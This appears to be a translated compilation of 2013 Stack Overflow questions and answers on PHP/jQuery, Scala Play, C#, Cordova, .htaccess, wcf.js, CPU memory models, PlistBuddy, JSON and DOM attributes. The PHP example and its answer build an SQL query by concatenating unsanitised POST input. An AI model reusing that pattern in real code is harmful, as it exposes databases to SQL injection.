我已经成功地完成了这部分，但是手头的下一个任务是我遇到的麻烦，因为我是 PHP 和 Javascript 的新手。

在我的点击事件处理程序中，我定义了一个变量“wtype”，我将其设置为选择选项的值：

```
wtype = $("select[name='wtype'] :selected").val() || 0; 
```

之后我希望做的是为具有匹配'wtype'的行导入相应的字段并将它们设置为它们自己的变量，即。“是”、“wcc”、“wbdmin”和“wbdmax”。之后我使用这些值来做一些数学运算等。

在做了一些研究/阅读之后，在我定义了“wtype”变量之后，我目前正在我的 js 文件中尝试以下操作（即使我真的不知道我在做什么）：

```
var data = {w : wtype};
var url = "get.php";
$.post(url, data).done(function(data) {
    var winfo = $.parseJSON(data);
    was = winfo[3];
    wcc = winfo[4];
    wbdmin = winfo[5];
    wbdmax = winfo[6];
    $("#result").html(winfo);
}); 
```

并在`get.php`：

```
<?php
  $host = "****";
  $dbname = "****";
  $user = "****";
  $pass = "****";
  try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
  }
  catch(PDOException $e) {
    echo $e->getMessage();
  }
  $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
  $name = $_POST["w"];
  $sql = "SELECT wtype, was, wcc, wbdmin, wbdmax FROM items WHERE wtype='".$name."'";
  $stmt = $conn->prepare($sql);
  $stmt->setFetchMode(PDO::FETCH_ASSOC);
  if ($stmt) {
    try {
      $stmt->execute();
      while ($row = $stmt->fetch()) {
        $data[] = $row;
      }
      $data = json_encode($data);
    }
    catch (PDOException $e) {
      var_dump($e);
    }
  }
?> 
```

这显然不起作用，因为我的数学结果是 NaN/undefined，而在使用测试变量值之前它起作用了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T10:40:07.520

您的 javascript 中有一些超出范围的索引错误。在您的 select 子句中，您选择五列，这会导致您在 javascript 中收到的数组的第一个值（即“wtype”列的内容）位于索引零处。所以你想要做的是：

```
var data = {w : wtype};
var url = "get.php";
$.post(url, data).done(function(data) {
    var winfo = $.parseJSON(data);
    was = winfo[1]; 
    wcc = winfo[2];
    wbdmin = winfo[3];
    wbdmax = winfo[4];
    $("#result").html(winfo);
}); 
```

此外，如果您不使用该`wtype`列，则可以将其排除在查询之外： `$sql = "SELECT was, wcc, wbdmin, wbdmax FROM items WHERE wtype='".$name."'";`

`SELECT`请注意根据您的子句相应地更改索引。

我还可以看到您编写了一个循环来迭代您的结果。如果我理解正确，每个 wtype 都是唯一的，并且只返回一行。如果是这样，你想改变这个：

```
$stmt->execute();
while ($row = $stmt->fetch()) {
  $data[] = $row;
}
$data = json_encode($data); 
```

对此：

```
$stmt->execute();
$row = $stmt->fetch();
$data = json_encode($row); 
```

如果这对您有帮助，请告诉我。或者如果我误解了你的问题。

# mongodb - Play-ReactiveMongo - 可以在控制器之外使用插件吗？

> ID：15562923
> 
> 赞同：2
> 
> 时间：2013-03-22T04:47:52.147
> 
> 标签：mongodb, scala, playframework-2.0, securesocial

如果我尝试在securesocial in memory 服务中使用play-reactive mongo，我会得到一个错误。

```
import play.api.Play.current

/**
 * A Sample In Memory user service in Scala
 *
 * IMPORTANT: This is just a sample and not suitable for a production environment since
 * it stores everything in memory.
 */
class InMemoryUserService(application: Application) extends UserServicePlugin(application) {

  private var users = Map[String, Identity]()
  private var tokens = Map[String, Token]()
[...] 
```

但它似乎在控制器内工作正常：

```
import play.api.Play.current

object Application extends Controller with securesocial.core.SecureSocial {

  val db = ReactiveMongoPlugin.db
  lazy val collections = db("persons")
[...] 
```

是否可以在控制器之外使用播放上下文？

我得到的错误是尝试访问使用所述类抛出错误的资源时：

```
! @6dl5aj9h3 - Internal server error, for (GET) [/login] ->

play.api.PlayException: Cannot load plugin[An exception occurred during Plugin [service.InMemoryUserService] initialization]
    at play.api.WithDefaultPlugins$$anonfun$plugins$1$$anonfun$apply$9.apply(Application.scala:149) ~[play_2.10.jar:2.1.0]
    at play.api.WithDefaultPlugins$$anonfun$plugins$1$$anonfun$apply$9.apply(Application.scala:130) ~[play_2.10.jar:2.1.0]
    at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:244) ~[scala-library.jar:na]
    at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:244) ~[scala-library.jar:na]
    at scala.collection.immutable.List.foreach(List.scala:309) ~[scala-library.jar:na]
    at scala.collection.TraversableLike$class.map(TraversableLike.scala:244) ~[scala-library.jar:na]
Caused by: play.api.PlayException: Cannot load plugin[An exception occurred during Plugin [service.InMemoryUserService] initialization]
    at play.api.WithDefaultPlugins$$anonfun$plugins$1$$anonfun$apply$9.apply(Application.scala:149) ~[play_2.10.jar:2.1.0]
    at play.api.WithDefaultPlugins$$anonfun$plugins$1$$anonfun$apply$9.apply(Application.scala:130) ~[play_2.10.jar:2.1.0]
    at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:244) ~[scala-library.jar:na]
    at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:244) ~[scala-library.jar:na]
    at scala.collection.immutable.List.foreach(List.scala:309) ~[scala-library.jar:na]
    at scala.collection.TraversableLike$class.map(TraversableLike.scala:244) ~[scala-library.jar:na]
         [repeats a lot]
Caused by: play.api.PlayException: Cannot load plugin[An exception occurred during Plugin [service.InMemoryUserService] initialization]
    at play.api.WithDefaultPlugins$$anonfun$plugins$1$$anonfun$apply$9.apply(Application.scala:149) ~[play_2.10.jar:2.1.0]
    at play.api.WithDefaultPlugins$$anonfun$plugins$1$$anonfun$apply$9.apply(Application.scala:130) ~[play_2.10.jar:2.1.0]
    at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:244) ~[scala-library.jar:na]
    at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:244) ~[scala-library.jar:na]
    at scala.collection.immutable.List.foreach(List.scala:309) ~[scala-library.jar:na]
    at scala.collection.TraversableLike$class.map(TraversableLike.scala:244) ~[scala-library.jar:na]
java.lang.StackOverflowError: null
    at java.io.UnixFileSystem.getBooleanAttributes0(Native Method) ~[na:1.6.0_43]
    at java.io.UnixFileSystem.getBooleanAttributes(UnixFileSystem.java:228) ~[na:1.6.0_43]
    at java.io.File.exists(File.java:733) ~[na:1.6.0_43]
    at sun.misc.URLClassPath$FileLoader.getResource(URLClassPath.java:999) ~[na:1.6.0_43]
    at sun.misc.URLClassPath$FileLoader.findResource(URLClassPath.java:966) ~[na:1.6.0_43]
    at sun.misc.URLClassPath$1.next(URLClassPath.java:196) ~[na:1.6.0_43] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T13:21:58.263

对的，这是可能的。我创建了一个插件来检查文件夹中的文件。如果找到它会读取文件，然后将内容保存到我的 mongo 实例中。

```
package plugins

import play.api.{Logger, Application, Plugin}
import akka.actor.Cancellable
import play.api.libs.concurrent.Akka
import scala.io.Source
import scalax.file.Path
import org.joda.time.DateTime
import org.joda.time.format.DateTimeFormat
import play.modules.reactivemongo.ReactiveMongoPlugin
import java.io.{IOException, FileNotFoundException}
import models.LeadCategory
import reactivemongo.api.DefaultDB
import scala.concurrent.ExecutionContext
import ExecutionContext.Implicits.global

/**
 * User: jakobdobrzynski
 * Date: 4/24/13
 * Time: 10:34 AM
 */
class WordImporter(application: Application) extends Plugin {

  val defaultInterval = 2
  var cancellable: Option[Cancellable] = None    

  val leadCategoryPathKey = "lead.categories.path"
  val newFile = ".new"
  val doneFiles = ".done"

  override def onStop() {
    cancellable.map(_.cancel())
  }

  override def onStart() {
    import play.api.Play.current
    import scala.concurrent.duration._
    import play.api.libs.concurrent.Execution.Implicits._

    val i = defaultInterval
    val newPath = current.configuration.getString(leadCategoryPathKey + newFile).getOrElse("")
    val donePath = current.configuration.getString(leadCategoryPathKey + doneFiles).getOrElse("")
    val db = ReactiveMongoPlugin.db

    cancellable = if (true) {
      Some(
        Akka.system.scheduler.schedule(0 seconds, i minutes) {
          Logger.info("Looking for files")
          val files = new java.io.File(newPath).listFiles
          for(f <- files) {
            if(f.getName.endsWith(".csv")) {
              handleCsvFile(f.getName, newPath, donePath, db)
            }
          }
          Logger.info("Done looking for files")
        })

    } else None
  }

  /*
  "caregoryId" -> BSONLong(leadCategory.categoryId),
  "categoryName" -> BSONString(leadCategory.categoryName),
  "word" -> BSONString(leadCategory.categoryName),
  "creationDate" -> leadCategory.creationDate.map(date => BSONDateTime(date.getMillis)),
  "updateDate" -> leadCategory.updateDate.map(date => BSONDateTime(date.getMillis)))
  */

  def handleCsvFile(fileName: String, newPath: String, donePath: String, db : DefaultDB) =    {

    Logger.info("Handling csv file: "+fileName)    
    lazy val collection = db("leadCategories")    
    try {
      val file = Source.fromFile(newPath + fileName)
      val iter = file.getLines().map(_.split(","))
      iter foreach (a => {
        collection.insert(LeadCategory(None, a(2).toLong, (""+a(1)).toLowerCase(), (""+a(0)).toLowerCase(), Some(DateTime.now()), Some(DateTime.now())))
      })
      Logger.info("Reading done! Time to move file")
      val path: Path = Path.fromString(newPath+fileName)

      val now = DateTime.now()
      val pattern = DateTimeFormat.forPattern("dd-MM-yyyy-hh-mm-ss")
      val nameParts = fileName.split("\\.")
      val dest: Path = Path.fromString(donePath+nameParts(0)+"-" + pattern.print(now) + "."+nameParts(1))
      path.moveTo(target = dest)
    } catch {
      case e: FileNotFoundException => {
        Logger.error("No file found")
      }
      case e: IOException => {
        Logger.error("Something went wrong when reading the file")
      }
    }
  }
} 
```

对我来说，神奇之处在于这两行：

```
import scala.concurrent.ExecutionContext
import ExecutionContext.Implicits.global 
```

希望它有帮助=)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-21T00:31:20.883

当我尝试使用 ReactiveMongo 实现securesocial UserService 时，我遇到了同样的错误。我最终通过改变来解决它

```
 val db = ReactiveMongoPlugin.db(application) 
```

至

```
 def db = ReactiveMongoPlugin.db(application) 
```

# c# - 如何打开一个进程并使整个班级都可以使用 Steam 读/写器

> ID：15562926
> 
> 赞同：2
> 
> 时间：2013-03-22T04:48:03.500
> 
> 标签：c#, process, stream, console

我目前正在编写一个应用程序来操作已经构建的现有控制台应用程序。目前我能够启动现有的应用程序，然后写入控制台并接收输出。但我需要我的应用程序基本上保持控制台应用程序在后台运行，并保持应用程序打开并准备向窗口写入新命令以接收更多信息。以下是我正在使用的当前代码。我想知道是否有办法在启动时调用此代码来启动控制台应用程序。

**代码**：

```
 private void Button_Click_1(object sender, RoutedEventArgs e)
    {
        string ApplicationPath = "python";
        string ApplicationArguments = "Console/dummy.py";
        string returnValue;

        //Process PyObj = new Process();
        ProcessStartInfo PyObjStartInfo = new ProcessStartInfo();

        PyObjStartInfo.FileName = ApplicationPath;
        PyObjStartInfo.Arguments = ApplicationArguments;
        PyObjStartInfo.RedirectStandardInput = true;
        PyObjStartInfo.RedirectStandardOutput = true;
        PyObjStartInfo.UseShellExecute = false;
        //PyObjStartInfo.CreateNoWindow = true;

        //PyObj.StartInfo = PyObjStartInfo;

        Thread.Sleep(5000);

        using (Process process = Process.Start(PyObjStartInfo))
        {
            StreamWriter sw = process.StandardInput;
            StreamReader sr = process.StandardOutput;

            if (sw.BaseStream.CanWrite)
            {
                sw.WriteLine("auth");
            }
            sw.Close();
            sw.Close();
            returnValue = sr.ReadToEnd();
            MessageBox.Show(returnValue.ToString());
        }
        //Thread.Sleep(5000);
        //PyObj.WaitForExit();
        //PyObj.Close();
    } 
```

正如您所看到的，这当前使用了一个按钮单击，但我希望代码在我的应用程序启动后立即运行。然后保持控制台应用程序运行并在内存中，以便我可以与之交互。有没有办法在 C#.net 中做到这一点？

以供参考。我调用的控制台应用程序是空白的，暂时只返回虚拟答案。这是下面的 Python 代码。

**蟒蛇代码**：

```
 import os, pprint

def main():
    keepGoing = True
    while keepGoing:
      response = menu()
      if response == "0":
          keepGoing = False
      elif response == "auth":
          print StartAuthProcess()
      elif response == "verify":
          print VerifyKey(raw_input(""))
      elif response == "get":
          print Info()
      else:
          print "I don't know what you want to do..."

def menu():
    '''
    print "MENU"
    print "0) Quit"
    print "1) Start Autentication Process"
    print "2) Verify Key"
    print "3) Get Output"

    return raw_input("What would you like to do? ")
    '''
    return raw_input();
def StartAuthProcess():
    return 1;

def VerifyKey(key):
    if(key):
        return 1;
    else:
        return 0;

def Info():
    info = "{dummy:stuff}";
    return info;

main() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:37:39.327

有几个地方可以放置可以立即运行的代码。首先，您将看到具有您的`static void Main`功能的 Program.cs。那是您的应用程序开始执行的地方。直到调用`Application.Run()`. 这是放置早期初始化内容的好地方。

如果您希望在首次打开表单时发生某些事情，您可以覆盖虚拟[`Form.OnShown`](http://msdn.microsoft.com/en-us/library/system.windows.forms.form.onshown.aspx)方法：

```
protected override void OnShown(EventArgs e) {
    base.OwnShown(e);

    // Call whatever functions you want here.
} 
```

请注意，您真的不应该像`Sleep`在 GUI 线程（也就是您的按钮单击处理程序）中那样使用任何阻塞调用。这将导致您的 GUI 挂起，并且感觉没有响应。我不确定您计划如何与后台进程交互（它是自动的还是用户驱动的？）但是任何阻塞调用（即从标准输出读取）都应该发生在后台线程上。然后，您可以使用`Control.Invoke`将调用编组回 UI 线程以更新控件等。

# android - 从android活动调用javascript返回值函数

> ID：15562927
> 
> 赞同：0
> 
> 时间：2013-03-22T04:48:07.113
> 
> 标签：android, cordova

可以帮助我从 android 本机代码中获取 javascript 函数的返回值。该[线程](https://stackoverflow.com/questions/12514039/calling-javascript-function-from-the-android-activity)的答案帮助我从 android java 活动类中获取 javascript 函数的警报值，而不是返回值。在下面的js函数中，如果我这样做

```
echo window.localStorage["email"] 
```

我在我的 java 活动类中收到警报。然而

```
return window.localStorage["email"] 
```

什么都不做，相反，我得到错误 cannot convert from `void`to `String`for my

```
MyActivity.activity.sendJavascript("userEmail();") 
```

* * *

这是我的js函数：

```
function userEmail() {
return window.localStorage["email"];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:20:51.670

尝试：

```
function userEmail() {
    var email=’’;
    email=window.localStorage["email"];
    return email;
} 
```

# jquery - 谷歌地图在blockUI上自动完成无法正常工作

> ID：15562934
> 
> 赞同：1
> 
> 时间：2013-03-22T04:49:09.773
> 
> 标签：jquery, css, google-maps

谷歌地图的地方`autocomplete`不能正常工作。它适用于按回车，但不适用于鼠标按下。我的意思是位置不会改变`mousedown`。它在弹出窗口之外正常工作。你可以检查顶部的链接`jsFiddle`。

[jsFiddle 网址](http://jsfiddle.net/aXXg3/)

# apache - 除非使用 .htaccess 登录，否则将所有流量重定向到保留页面

> ID：15562941
> 
> 赞同：1
> 
> 时间：2013-03-22T04:49:54.467
> 
> 标签：apache, .htaccess, .htpasswd

我目前在我的 domain.com 上设置了一个登录页面，它已经收到了流量。

它将很快被在线商店取代。我需要将此商店上传到我的实时服务器，以便获得商家设施提供商 (MFP) 的批准，并且他们要求它可以从 domain.com 上的最终实时位置访问它以获得批准。在获得批准之前，我不能让用户访问该网站。

为此，我希望将所有 domain.com 流量重定向到 domain.com/holding/，MFP 访问者除外。

理想情况下，这将受到 IP 地址的限制，但是 MFP 表示他们需要授予许多外部方访问权限，因此基于 IP 地址的访问权限将不可接受，我应该使用密码。

所以我的问题是，除非他们使用 domain.com/login 的密码登录，否则如何自动将所有流量从 domain.com 重定向到保留页面 domain.com/holding/？不应要求访问 domain.com 的用户输入密码。

仅使用 .htaccess/.htpasswd 可以实现吗？如果是这样，有人可以建议它如何工作的逻辑吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:08:07.543

仅使用一个文件是不可能的，因为如果您在 domain.com 站点的级别`.htaccess`上启用它，所有访问者都会看到一个 HTTP 标准身份验证对话框。`doc_root`

不知道您使用的是什么脚本语言？（您没有在标签中指出，只是 apache），但您可以提供一个索引页面，既可以作为用户/潜在用户的登录页面，也可以为 MFP 各方提供登录（用户名/密码表单）（无论他们来自哪里）。

这样，您既可以满足这两种需求，又不会以任何方式冒犯或歧视任何一方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T07:25:49.460

正如@nickhar 所指出的，仅使用.htaccess 似乎没有办法做到这一点。我的解决方案是使用重写规则将所有请求从 domain.com 重定向到 domain.com/holding，除非设置了特定的 cookie（检查是否使用 RewriteCond %{HTTP_COOKIE}）。我在 domain.com/login 上的 php 脚本中设置了这个 cookie，该脚本使用 .htaccess/.htpasswd 进行密码保护。

这绝不是一个特别安全的解决方案，但足以满足我在完成审批过程时将网站隐藏在一般流量之外的目的。

# xml - node.js 中的 WCF Web 服务

> ID：15562943
> 
> 赞同：1
> 
> 时间：2013-03-22T04:50:02.387
> 
> 标签：xml, wcf, web-services, node.js, basichttpbinding

谁能帮我说一下下面的代码有什么问题

```
var BasicHttpBinding = require('wcf.js').BasicHttpBinding
, Proxy = require('wcf.js').Proxy
, binding = new BasicHttpBinding()
, proxy = new Proxy(binding,"http://www.restfulwebservices.net/wcf/WeatherForecastService.svc")
, message = '<Envelope xmlns=' +
        '"http://schemas.xmlsoap.org/soap/envelope/">' +
             '<Header />' +
               '<Body>' +
                 '<GetCitiesByCountry xmlns="http://www.restfulwebservices.net/ServiceContracts/2008/01">' +
                  '<Country>korea</Country>' +
                  '</GetCitiesByCountry>' +
                '</Body>' +
           '</Envelope>'

proxy.send(message, "http://www.restfulwebservices.net/ServiceContracts/2008/01/IWeatherForecastService/GetCitiesByCountry", function(response, ctx) {
console.log(response)
}); 
```

我收到以下错误

```
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><s:Fault>  <faultcode xmlns:a="http://schemas.microsoft.com/ws/2005/05/addressing/none">a:ActionNotSupported</faultcode><faultstring xml:lang="en-US">The message with Action 'http://www.restfulwebservices.net/ServiceContracts/2008/01/IWeatherForecastService/GetCitiesByCountry' cannot be processed at the receiver, due to a ContractFilter mismatch at the EndpointDispatcher. This may be because of either a contract mismatch (mismatched Actions between sender and receiver) or a binding/security mismatch between the sender and the receiver.  Check that sender and receiver have the same contract and the same binding (including security requirements, e.g. Message, Transport, None).</faultstring></s:Fault></s:Body></s:Envelope> 
```

对此的任何帮助都会非常有帮助。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T09:29:32.367

Wcf.js 仅支持肥皂服务。您不能将 Wcf.js 用于 REST Web 服务。

# c++ - 双插槽与单插槽内存模型？

> ID：15562944
> 
> 赞同：7
> 
> 时间：2013-03-22T04:50:02.920
> 
> 标签：c++, c, linux, memory

从在 Linux 上运行的 C/C++ 程序的角度来看，我对**双 CPU 机器中的****内存**是什么样子感到有些困惑。

 ****案例一（了解）**

使用**一个四核 HT CPU**和 32GB RAM，理论上我可以编写一个单进程应用程序，使用多达 8 个线程和多达 32GB RAM，而不会进入交换或线程设施超载 - 我忽略了操作系统和其他为简单起见，此处处理。

**案例2（混淆）**

设置了 64GB RAM的**双四核 HT CPU**会发生什么？

开发方面，您是否需要编写一个应用程序以作为两个进程（8 个线程，每个 32GB）进行通信，或者您可以将其编写为一个进程（16 个线程，64GB 完整内存）？

如果答案是前者，那么利用整个硬件的一些有效的现代策略是什么？嘘？工控机？另外，如何指导 Linux 为每个进程使用不同的 CPU？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-22T04:53:51.737

从应用程序的角度来看，物理 CPU（裸片）的数量并不重要。只有虚拟处理器的数量。这些包括所有处理器上的所有内核，如果在内核上启用了超线程，则加倍。以相同的方式在它们上安排线程。核心是全部在一个裸片上还是分布在多个裸片上都没有关系。

一般来说，处理这些事情的最好方法是*不*。不要担心在哪个核心上运行什么。只需为您的应用程序生成适当数量的线程（理论上最大值等于系统中的内核总数），然后让操作系统处理调度。

当然，内存在系统中的所有内核之间共享。但同样，由操作系统来处理物理内存的分配。很少有应用程序真正需要担心它们使用了多少内存，以及在线程之间分配内存。让操作系统来处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T05:04:54.943

内存模型**与内核数量本身无关**，而是与多核计算机上采用的架构有关。大多数**主流**计算机使用对称多处理模型，其中单个操作系统控制所有 CPU，并且在这些 CPU 上运行的程序可以访问所有可用内存。每个 CPU 都有私有内存（缓存），但 RAM 都是共享的。因此，如果您有 64 位机器，无论您编写 1 个进程还是两个进程，就内存使用的影响而言，它都会有所不同。明智地编程，您最好使用单个进程。

正如其他人指出的那样，您确实需要担心线程关联等，但这更多地与 CPU 资源的有效使用有关，而与 RAM 的使用关系不大。不过，缓存使用会产生一些影响。

与其他内存模型计算机相比，例如 NUMA（非统一内存访问），其中每个 CPU 都有自己的内存块，然后跨 CPU 通信需要一些仲裁器。在这些计算机上，您需要担心在内存方面将线程放置在哪里。**

# ios - 如何使用 PListBuddy 将条目从一个文件复制到另一个文件？

> ID：15562946
> 
> 赞同：3
> 
> 时间：2013-03-22T04:50:17.573
> 
> 标签：ios, xcode, bash, shell, plist

我一直是 StackOverflow 的长期查看者，总是在必要时找到我的解决方案，但经过一周非常专注的研究后，我发现了一个没有解决方案的问题。

我想做的是扩展这个人的研究： http: [//mrox.net/blog/2008/11/16/adding-debug-only-preferences-in-iphone-applications/](http://mrox.net/blog/2008/11/16/adding-debug-only-preferences-in-iphone-applications/)

我想让调试菜单作为主 Plist 文件的一部分出现，而不是作为子窗格。

到目前为止，我有大约 95% 的 Plist 类型在处理小问题。简而言之，我基本上是在“调试”Plist 中进行迭代，然后将它们描绘到目标 Plist 上。

现在，由于某种原因，多个值将无法以这种形式工作，因为标题/值似乎没有正确设置（不知道为什么 - 在下面添加了代码以供仔细阅读）。

我发现确实有效的一种解决方案是使用 PlistBuddy 的 COPY 命令并复制条目，但这仅限于同一个文件，这不是我需要的。

因此，总而言之：我想使用 Bash/Shell 通过 XCode 构建脚本使用 PlistBuddy 将条目从 Plist 文件 A 复制到 Plist 文件 B。

代码如上：（获取入口添加的代码）

```
# Configure the Entry
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX dict" ${DEST_PLIST}
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Type string 'PSMultiValueSpecifier'" ${DEST_PLIST}

# Retrieve the Additional Field Value
preferenceTitle=`$PLISTBUDDY -c "Print PreferenceSpecifiers:$SOURCE_INDEX:Title" $SOURCE_PLIST 2>&1`
preferenceKey=`$PLISTBUDDY -c "Print PreferenceSpecifiers:$SOURCE_INDEX:Key" $SOURCE_PLIST 2>&1`
preferenceDefaultValue=`$PLISTBUDDY -c "Print PreferenceSpecifiers:$SOURCE_INDEX:DefaultValue" $SOURCE_PLIST 2>&1`
preferenceValues=`$PLISTBUDDY -c "Print PreferenceSpecifiers:$SOURCE_INDEX:Values" $SOURCE_PLIST 2>&1`
preferenceTitles=`$PLISTBUDDY -c "Print PreferenceSpecifiers:$SOURCE_INDEX:Titles" $SOURCE_PLIST 2>&1` 
```

添加新条目的代码：

```
# Set the Additional Field Values
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Title string $preferenceTitle" ${DEST_PLIST}
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Key string $preferenceKey" ${DEST_PLIST}
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:DefaultValue integer $preferenceDefaultValue" ${DEST_PLIST}
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Values array $preferenceValues" ${DEST_PLIST}
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Titles array $preferenceTitles" ${DEST_PLIST} 
```

如果您对 PlistBuddy 的未记录功能有任何了解，请提供帮助。MAN 页面非常纤薄，示例很多。

我要感谢您阅读本文并感谢您的智慧来帮助我解决我脖子上的主要疼痛。

**编辑：** 经过更多调查，条目已成功填充，但数组除外。有关详细信息，请参阅下面的代码/输出。

这是产生以下数据的代码片段：

```
echo "#########"
echo "[$THIS] adding $preference: $preferenceDict"
echo "#########"
echo "Source: "`$PLISTBUDDY -c "Print PreferenceSpecifiers:$SOURCE_INDEX:Values" $SOURCE_PLIST`
echo "Source: "`$PLISTBUDDY -c "Print PreferenceSpecifiers:$SOURCE_INDEX:Titles" $SOURCE_PLIST`
echo "#########"
echo "Destination: "`$PLISTBUDDY -c "Print PreferenceSpecifiers:$DEST_INDEX:Values" $DEST_PLIST`
echo "Destination: "`$PLISTBUDDY -c "Print PreferenceSpecifiers:$DEST_INDEX:Titles" $DEST_PLIST`
echo "#########" 
```

这是提供的数据，证明正在传输正确的字段

```
#########
[addDebugSettingsMenu.bash] adding : Dict {
    Titles = Array {
        Meters
        Feet
    }
    DefaultValue = 1
    Values = Array {
        1
        2
    }
    Key = UserPreferences_UnitsKey
    Type = PSMultiValueSpecifier
    Title = Units
}
#########
Source: Array {     1     2 }
Source: Array {     Meters     Feet }
#########
Destination: Array { }
Destination: Array { }
######### 
```

**编辑#2：** 我发现我可以通过分解数组并添加单个元素来正确添加数组：

```
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Titles array" ${DEST_PLIST}

${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Titles:0 string 'TITLE_1'" ${DEST_PLIST}
${PLISTBUDDY} -c "Add PreferenceSpecifiers:$DEST_INDEX:Titles:1 string 'TITLE_2'" ${DEST_PLIST}
etc... 
```

我仍然希望那里有更好的解决方案。

# json - 如何以 Json 结构发送数据

> ID：15562955
> 
> 赞同：1
> 
> 时间：2013-03-22T04:51:25.143
> 
> 标签：json, rest, dojo

我有一个休息服务，我将 Json 数据作为`["1","2","3"]`（字符串列表）发送，这在 firefox 休息客户端插件中运行良好，但是在应用程序中发送数据时，结构是`{"0":"1","1":"2","2":"3"}`格式，我无法传递数据，如何转换`{"0":"1","1":"2","2":"3"}`为`["1","2","3"]`以便我可以通过应用程序发送数据，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:05:10.573

如果 json 的格式是`{ "index" : "value" }`, 是我在 中看到的`{"0":"1","1":"2","2":"3"}`，那么我们可以利用该信息，您可以这样做：

```
var myObj = {"0":"1","1":"2","2":"3"};
var convertToList = function(object) {
   var i = 0;
   var list = [];
   while(object.hasOwnProperty(i)) {   // check if value exists for index i
        list.push(object[i]);          // add value into list
        i++;                           // increment index
   } 
   return list;
};

var result = convertToList(myObj);    // result: ["1", "2", "3"] 
```

见小提琴：http: [//jsfiddle.net/amyamy86/NzudC/](http://jsfiddle.net/amyamy86/NzudC/)

使用虚假索引“*迭代*”列表。请记住，如果索引中断，这将不起作用，不能这样：`{"0":"1","2":"3"}`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-23T10:37:43.470

您需要将 json 解析回 javascript 对象。正如其他贡献者之一已经指出的那样，dojo 的后续迭代中有解析工具，但是大多数浏览器都支持`JSON.parse()`ECMA-262 第 5 版（JS 所基于的规范）中定义的 . 它的用法是：

```
var str = your_incoming_json_string,
// here is the line ...
obj = JSON.parse(string);

// DEBUG: pump it out to console to see what it looks like
a.forEach(function(entry) {
  console.log(entry);
}); 
```

对于不支持的浏览器，`JSON.parse()`您可以使用 json2.js 来实现它，但是由于您实际上是在使用 dojo，`dojo.fromJson()`所以您可以这样做。Dojo 为您处理浏览器独立性。

```
var str = your_incoming_json_string,
// here is the line ...
obj = dojo.fromJson(str);

// DEBUG: pump it out to console to see what it looks like
a.forEach(function(entry) {
  console.log(entry);
}); 
```

如果您使用的是 AMD 版本的 Dojo，那么您需要返回 Dojo 文档并查看[dojo.fromJson](http://dojotoolkit.org/reference-guide/1.7/dojo/fromJson.html)页面上的 dojo/_base/json 示例。

# javascript - javascript setAttribute("name",newname) 不更改它创建的文本框名称 submitName

> ID：15562956
> 
> 赞同：3
> 
> 时间：2013-03-22T04:51:30.680
> 
> 标签：javascript, html

我使用这个函数在表中创建一个新行

```
 function addRow(obj) 
    {
            var table = document.getElementById("table2");
            var rowCount = table.rows.length-1;
            var row = table.insertRow(rowCount);
            var nowrownum = table.rows.length-1;        
            var colCount = table.rows[2].cells.length;
            for(var i=0; i<colCount; i++) {
                var newcell = row.insertCell(i);
                newcell.innerHTML = table.rows[2].cells[i].innerHTML;
                newcell.style.cssText = table.rows[2].cells[i].style.cssText;

//Here is problem
                newcell.childNodes[0].setAttribute("name",table.rows[2].cells[i].childNodes[0].getAttribute("name")+nowrownum);
//End here                 
                newcell.childNodes[0].id    = table.rows[2].cells[i].childNodes[0].id+nowrownum;
                switch(newcell.childNodes[0].type)  
                {
                    case "text":
                            newcell.childNodes[0].value = "";
                            break;
                }
            }
            obj.style.visibility = "hidden"; //to hide current button
    } 
```

这是我的html代码

```
 <form name=form id=form  method=POST target="frametemp">
    <table name ="table2" id="table2" border="1"  align="Center">
     <tr>
         <th>Head1</th>
         <th>Head2</th>
         <th>Head3</th>
         <th>Head4</th>
     </tr>
     <tr>
         <td>xxxxx</td>
         <td><input type="text" id="edit_0"   name="edit_0" ></td>
         <td>yyyy</td>
         <td><input id="add_bt_0" onclick="JavaScript : addRow(this);" name="add_bt_0" value="addrow" type="button" ></td>
     </tr> 
```

添加行后，我从 ie 开发人员工具中检查页面

```
<td><input type="text" id="edit_1"   name="edit_0" submitName="edit_1" ></td>
<td><input id="add_bt_1" onclick="JavaScript : addRow(this);" name="add_bt_0" submitName="add_bt_1" value="addrow" type="button" ></td> 
```

name 属性不会改变，但它会创建 submitName。

我怎样才能更改名称属性。我的目标浏览器是 IE 7++（现在我使用 ie 9）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:05:32.100

你如何改变id ..?? 使用相同的代码更改属性名称..我的意思是

```
newcell.childNodes[0].name = table.rows[2].cells[i].childNodes[0].name + nowrownum; 
```

* * *

